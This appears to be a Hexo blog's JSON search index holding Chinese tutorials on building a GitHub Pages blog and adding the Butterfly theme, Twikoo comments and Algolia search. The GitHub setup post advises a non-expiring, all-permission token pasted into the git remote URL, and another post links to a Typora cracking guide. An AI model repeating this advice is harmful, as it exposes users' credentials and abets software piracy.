主机记录随便写，我填的是blog 记录值设置为你的网站域名，例如我的是：hellodqy.github.io 点击确认 现在已经生成了一个二级域名，但是这个域名并不能打开任何网页，因为它没有与Github Page绑定，本教程不需要绑定！想绑定的话直接去Github的仓库找到CNAME文件，没有的话就自己创建一个，将自己的二级域名添加到文件第一行（内容必须为一行）,此时在地址栏输入自己的子域名就可以跳转到 Github Page 页面了 更改DOMAINS打开Vercel 将刚刚申请的二级域名填进去，点击Save 然后会出现报错：要求我们到DNS Provider去添加记录 回到这个界面，先删除记录值为你的网站域名的那条记录，再次添加记录 注意：如果你按照我前面给的Github绑定二级域名教程到Github生成了CNAME文件的话，得去删掉CNAME文件 按照报错提示填：类型：CNAME；主机记录：刚刚填的是什么，现在就填什么，比如刚刚申请二级域名我填的是blog，现在就填blog 主要是记录值要改，填报错提示中的value值，点击确认 回到Vercel的这个界面，点击上方的Deployments选项 找到current记录，点击三个点，点击Redeploy 看到DOMAINS是你设置的二级域名就修改正确了 过几分钟，点击查看新的DOMAINS网页中出现云函数运行成功即可，如图： 获取Vercel的环境ID(enVId)1https:// + DOMAINS(就是你设置的二级域名) 前端部署修改主题配置文件_config.butterfly.yml，搜索twikoo，你只需要把获取到Vercel的环境 ID (envId) 填写到配置上去就行，其他不改： 12345twikoo: envId: region: visitor: false option: 然后搜索comments，设置评论应用为： 12comments: use: twikoo 12注意：最新评论只会在刷新时才会去读取，并不会实时变化由于 API 有 访问次数限制，为了避免调用太多，主题默认存取期限为 10 分鐘。也就是説，调用后资料会存在 localStorage 里，10 分鐘内刷新网站只会去 localStorage 读取资料。 10 分鐘期限一过，刷新页面时才会去调取 API 读取新的数据。（ 3.6.0 新增了 storage 配置，可自行配置缓存时间） 在侧边栏显示最新评论板块 修改主题配置文件 _config.butterfly.yml 1234567# Aside widget - Newest Commentsnewest_comments: enable: true sort_order: # Don&#x27;t modify the setting unless you know how it works limit: 6 storage: 10 # unit: mins, save data to localStorage avatar: true 登录Twikoo管理面板：先把刚刚的所有修改保存并部署到本地 打开网站随便一篇文章翻到页面底部，点击设置并注册管理员密码 评论设置完毕，测试一下吧~","tags":"博客插件"},{"title":"Hexo集成Algolia实现网站搜索引擎","url":"/post/fe591630.html","text":"创建 Alogolia Index首先登陆进入 Algolia 官网，我们可以使用 GitHub 或 Google 帐号登录。 创建一个Index，随便取一个名字 配置API Key 接下来我们需要配置 Algolia——API Keys 到我们自己的 hexo 站点中，关联两者，使得 Algolia 能够搜集我们 hexo 站点的数据通过 API 发送给 Aloglia 回到首页打开API Keys，其中的 Application ID 、Search-Only API Key、Admin API KEY信息将会被用到 首先我们需要修改Blog根目录下的 _config.yml： 1234algolia: applicationID: &#x27;你的Applicaiton ID&#x27; apiKey: &#x27;你的Search-Only API Key&#x27; indexName: &#x27;创建的索引名称&#x27; 然后我们需要配置一个名称为 HEXO_ALGOLIA_INDEXING_KEY，内容为 Alogolia 网页中 Admin API KEY 的环境变量，在Blog根目录下进行Git Bash并输入下列命令： 1export HEXO_ALGOLIA_INDEXING_KEY=你的Admin API KEY 通过 Hexo Aloglia 获取站点数据前面我们创建了 Index，但是此时为空，不包含任何数据。我们需要安装 Hexo Aloglia 扩展，这个扩展的功能是搜集站点的内容并通过 API 发送给 Aloglia 1npm install --save hexo-algolia 安装完成后，在 hexo 站点根目录下执行下列命令来搜集数据更新到我们刚创建的 Index 中： 1hexo algolia 如上图所示则代表成功将 hexo 站点中的数据发送到了 Alogolia 的 Index 中，我们可以在网页中看到所有的数据 主题集成Algolia：更改主题配置文件的_config.yml(注意是主题配置文件的_config.yml，我的是Blog/themes/butterfly目录下的，不是Blog根目录的_config.yml)，找到 Algolia Search 配置部分(文件当中有，直接搜索)，将enable 改为true 即可： 12345# Algolia searchalgolia_search: enable: true hits: per_page: 6 修改搜索目录之前一直没改站点URL，昨晚折腾到一点过也没搞好，今早遇到大佬指点才解决 如果你能搜索到对应文章但是点击搜索记录却是这样的页面 那应该是你的站点URL没有修改，打开Blog根目录下的_config.yml，将Url里面的网址修改为你的域名 重新部署1hexo cl &amp;&amp; hexo g &amp;&amp; hexo s 注意：每次对网站内容修改以后都需要更新Algolia1hexo algolia","tags":""},{"title":"hexo博客安装butterfly主题","url":"/post/8f1335fc.html","text":"Butterfly 主题安装1git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly 这里面如果报错，如下图所示 执行下列命令： 12git config --global --unset http.proxy git config --global --unset https.proxy 应用主题Blog根目录下找到站点配置文件_config.yml文件 搜索找到theme，将landscape改为butterfly 安装插件如果你没有 pug 以及 stylus 的渲染器，请下载安装： 1npm install hexo-renderer-pug hexo-renderer-stylus --save","tags":"博客美化"},{"title":"博客撰写与发布","url":"/post/c2ec21ed.html","text":"Typora下载与配置下载与破解教程：2022最新Typora破解激活教程) 文件夹介绍 _config.yml：俗称站点配置文件，很多与博客网站的格式、内容相关的设置都需要在里面改。 node_modules:存储Hexo插件的文件，可以实现各种扩展功能。一般不需要管。 scaffolds：模板文件夹，里面的post.md文件可以设置每一篇博客的模板。具体用起来就知道能干嘛了。 source：非常重要。所有的个人文件都在里面！ themes：主题文件夹，可以从Hexo主题官网或者网上大神的Github主页下载各种各样美观的主题，让自己的网站变得逼格高端的关键！ 生成新文章1hexo new post &quot;新建博客文章名&quot; 文章标题与封面 title：文章标题 cover：文章封面 categories：文章分类 tags：文章标签 发布博客 清理静态缓存 1hexo cl 生成 1hexo g 本地部署 1hexo s ​ 部署以后打开一个浏览器，在网址栏输入localhost:4000/即可看到网站更新 部署到Github 1hexo d 部署经常失败请参考：博客部署到github失败","tags":"博客搭建"},{"title":"butterfly主题的基础通用配置","url":"/post/227e574e.html","text":"循环动态显示文字可设置主页中展示的网站副标题或者自己喜欢的座右铭 修改主题配置文件_config.butterfly.yml 1234567891011121314151617181920# Sitetitle: Hexosubtitle: enable: true # Typewriter Effect (打字效果) effect: true # loop (循環打字) loop: true # source 調用第三方服務 # source: false 關閉調用 # source: 1 調用一言網的一句話（簡體） https://hitokoto.cn/ # source: 2 調用一句網（簡體） http://yijuzhan.com/ # source: 3 調用今日詩詞（簡體） https://www.jinrishici.com/ # subtitle 會先顯示 source , 再顯示 sub 的內容 # source: 3 # 如果關閉打字效果，subtitle 只會顯示 sub 的第一行文字 sub: - 我双手合十的愿望里永远有你。 - 穿越人海，只为与你相拥。 - 手握日月摘 ♥ 悦。 侧边栏设置修改主题配置文件_config.butterfly.yml，搜索aside 带有card_前缀的是显示在网页右边的那一竖列的内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# aside (側邊欄)# --------------------------------------aside: enable: true hide: false button: true mobile: true # display on mobile position: right # left or right display: archive: true tag: true category: true card_author: enable: true description: button: enable: true icon: fab fa-github text: Follow Me link: https://github.com/hellodqy card_announcement: enable: true content: DQY &amp; WY card_recent_post: enable: true limit: 5 # if set 0 will show all sort: date # date or updated sort_order: # Don&#x27;t modify the setting unless you know how it works card_categories: enable: true limit: 8 # if set 0 will show all expand: none # none/true/false sort_order: # Don&#x27;t modify the setting unless you know how it works card_tags: enable: true limit: 40 # if set 0 will show all color: false orderby: random # Order of tags, random/name/length order: 1 # Sort of order. 1, asc for ascending; -1, desc for descending sort_order: # Don&#x27;t modify the setting unless you know how it works card_archives: enable: true type: monthly # yearly or monthly format: MMMM YYYY # eg: YYYY年MM月 order: -1 # Sort of order. 1, asc for ascending; -1, desc for descending limit: 8 # if set 0 will show all sort_order: # Don&#x27;t modify the setting unless you know how it works card_webinfo: enable: true post_count: true last_push_date: true sort_order: # Don&#x27;t modify the setting unless you know how it works 首页文章数目首页显示的文章数目在Blog根目录下的系统配置文件修改，打开_config.yml搜索index_generator per_page可以修改显示的文章数目 12345678# Home page setting# path: Root path for your blogs index page. (default = &#x27;&#x27;)# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: &#x27;&#x27; per_page: 5 order_by: -date 访问人数修改主题配置文件_config.butterfly.yml，搜索busuanzi 1234busuanzi: site_uv: true site_pv: true page_pv: true 运行时间修改主题配置文件_config.butterfly.yml，搜索runtimeshow 123456runtimeshow: enable: true publish_date: 6/7/2018 00:00:00 ##网页开通时间 #格式: 月/日/年 时间 #也可以写成 年/月/日 时间 字数统计进入Blog根目录并执行 1npm install hexo-wordcount —save or yarn add hexo-wordcount 修改主题配置文件_config.butterfly.yml，搜索wordcount 12345wordcount: enable: true post_wordcount: true min2read: true total_wordcount: true 导航菜单修改主题配置文件_config.butterfly.yml，去掉前面的井号就是启用该选项 1234567891011121314menu: 首页: / || fas fa-home 归档: /archives/ || fas fa-archive 摸鱼||fas fa-fish: 游戏: /moyu/ || fas fa-gamepad 工具: /tools/ || fas fa-tools 蓝桥: /lanqiao/ || fas fa-folder-open 标签: /tags/ || fas fa-tags # 分类: /categories/ || # List||fas fa-list: # Music: /music/ || fas fa-music # Movie: /movies/ || fas fa-video 友人帐: /link/ || fas fa-link 关于我: /about/ || fas fa-heart 关键页面生成博客有一些关键页面需要手动生成。 标签页进入Blog根目录cmd执行 1hexo new page tags 打开 source/tags/index.md 文件，修改如下 12345---title: 标签date: 2022-03-11 12:53:45type: &quot;tags&quot;--- 分类页进入Blog根目录cmd执行 1hexo new page categories 打开source/categories/index.md文件，修改如下 12345---title: 分类date: 2022-03-11 12:56:06type: &quot;categories&quot;--- 背景图片参考 https://wallhaven.cc/ https://wall.alphacoders.com/ https://bz.zzzmh.cn/index 网站美化：http://haiyong.site/post/22e1d5da.html 背景图设置顶部图 配置 含义 index_img 主页的 top_img default_top_img 默认的 top_img，当页面的 top_img 没有配置时，会显示 default_top_img archive_img 归档页面的 top_img tag_img tag 子页面 的 默认 top_img tag_per_img tag 子页面的 top_img，可配置每个 tag 的 top_img category_img category 子页面 的 默认 top_img category_per_img category 子页面的 top_img，可配置每个 category 的 top_img 修改主题配置文件_config.butterfly.yml ctrl+f直接搜索index_img 1index_img: 图片链接(例如: https://s1.ax1x.com/2023/04/25/p9uqhKU.jpg) tag_per_img 和 category_per_img 是 3.2.0 新增的内容，可对 tag 和 category 进行单独的配置 并不推荐为每个 tag 和每个 category 都配置不同的顶部图，因为配置太多会拖慢生成速度 footer背景修改主题配置文件_config.butterfly.yml 12# footer是否显示图片背景(与 top_img一致)footer_bg: true 背景图打开主题配置文件的_config.yml搜索background，修改background后面的链接即可 注意：链接一定要用url()括起来！！！如果用纯色的话，色号要用单引号括起来，例如：’#add2c2’ 打字效果修改主题配置文件_config.butterfly.yml，搜索activate-power-mode 1234567# Typewriter Effect (打字效果)# https://github.com/disjukr/activate-power-modeactivate_power_mode: enable: true colorful: true # open particle animation (冒光特效) shake: true # open shake (抖動特效) mobile: false 鼠标点击效果修改主题配置文件_config.butterfly.yml 烟花，搜索fireworks zIndex：-1表示烟火效果在底部；9999表示效果在前面 1234fireworks: enable: true zIndex: 9999 # -1 or 9999 mobile: false 爱心，搜索click_heart 1234# 点击出現爱心click_heart: enable: true mobile: false 搜索ClickShowText 12345678910# 点击出现文字，文字可自行修改ClickShowText: enable: false text: - I - LOVE - YOU fontSize: 15px random: false # 文字随机显示 mobile: false 打赏修改主题配置文件_config.butterfly.yml，搜索reward，注意将照片修改为自己的收款码 12345678910# Sponsor/rewardreward: enable: true QR_code: - img: /img/wechat.jpg link: text: 微信 - img: /img/alipay.jpg link: text: 支付宝 修改代码高度代码过长默认全部显示影响美观，需要设置高度限制 打开主题配置文件_config.butterfly.yml，搜索highlight，将false改为300(大概就是显示12行代码，超过12行会被折叠起来) 实现效果","tags":"博客美化"},{"title":"Hexo+Github搭建个人博客","url":"/post/405e7e90.html","text":"啊~磕磕绊绊终于搭好了，分享一下我的搭建过程和遇到的问题与解决方案： 安装并配置Node.js注意： 没有需求千万不要安装cnpm！(参考文章第五步有一个按需安装cnpm) cmd全程使用管理员模式打开 参考文章：https://blog.csdn.net/weixin_52799373/article/details/123840137 cmd管理员模式下执行下述命令 1npm install -g hexo-cli 安装并配置Git这个没什么坑，照着教程做就好 Git教程：https://www.cnblogs.com/xueweisuoyong/p/11914045.html 创建Github仓库 呐，这里一定要注意，仓库名称一定得是你的Github用户名.github.io 例如：你的Github用户名叫做helloworld，那么仓库名称就应该设置为helloworld.github.io 另外，访问权限得设置成Public，设成Private不得行！ 生成Github SSH Token注意：生成的Token记得复制并保存下来 Expiration是这个Token的使用期限，我偷懒就爱选择No expiration(永不过期) 权限全勾上就好 使用SSH Token 删除远程仓库地址 1git remote remove origin 检查是否删除成功 1git remote -v 没有输出证明删除成功 链接远程仓库 注意：不要直接复制，SSH密钥粘贴刚刚保存的Token，用户名和仓库名记得替换成你自己的 1git remote add origin https://SSH密钥@github.com/用户名/仓库名.git 完成后再次输入第二步的命令，看到fetch和pull的网址里面出现有生成SSH Token就设置成功了 1git remote -v 生成SSH Keys执行下述命令，提示选择y/n就输入y，没有就一路回车 1ssh-keygen -t rsa -C &quot;你的邮箱地址&quot; 找到密钥位置并复制 测试ssh是否绑定成功 1ssh -T git@github.com 如果问你yes/no直接yes 本地访问博客 创建一个Blog文件夹并启用Git Bash Here 初始化hexo 1hexo init 这里折腾了好久，一直显示command not found，重装了好几次node.jx，分析应该是前面安装了cnpm导致hexo的存储位置被改掉了 解决：前面加一个npx就好了，还是不行的话就自行百度谷歌吧 这里使用npx hexo … 的话，以后所有hexo命令都需要加上npx 1npx hexo init 生成本地的hexo页面 1hexo s 访问 浏览器输入： 1http://localhost:4000/ ​ ctrl+c关闭服务器 上传Blog到Github修改-config.yml文件 打开该文件并修改内容： 1234deploy: type: git repository: 你的github地址 branch: main 安装hexo-deployer-git 自动部署发布工具1npm install hexo-deployer-git --save 生成页面 1hexo g 本地文件上传到Github 1hexo d 注意：中间会出现登录界面，复制前面生成的SSH Token粘贴进去就好 注意：网络报错多次尝试就好 访问Github博客浏览器网址输入 1https://用户名.github.io/ 这一步折腾最久，做好的html网页传到Github后，用户名.github.io打不开，报错404，如图 解决：一开始试了很多网上的办法，比如点击页面中间的read the full documention然后跟着里面的步骤操作，没有效果，但是检查了很多遍仓库配置都没有问题，后来发现只是workflow一直没有启动，刷新一下仓库配置就可以了 打开.github.io仓库并点击Setiings 点击右侧菜单的Pages并重新选择Source和Branch，我当时配置是对的就没有改，但是保持原来的配置只是重新选择并保存一下可以刷新配置，邮箱就收到workflow启用的邮件了~ 博客搭建完毕~","tags":"博客搭建"},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""},{"url":"","text":"","tags":"","title":""}]}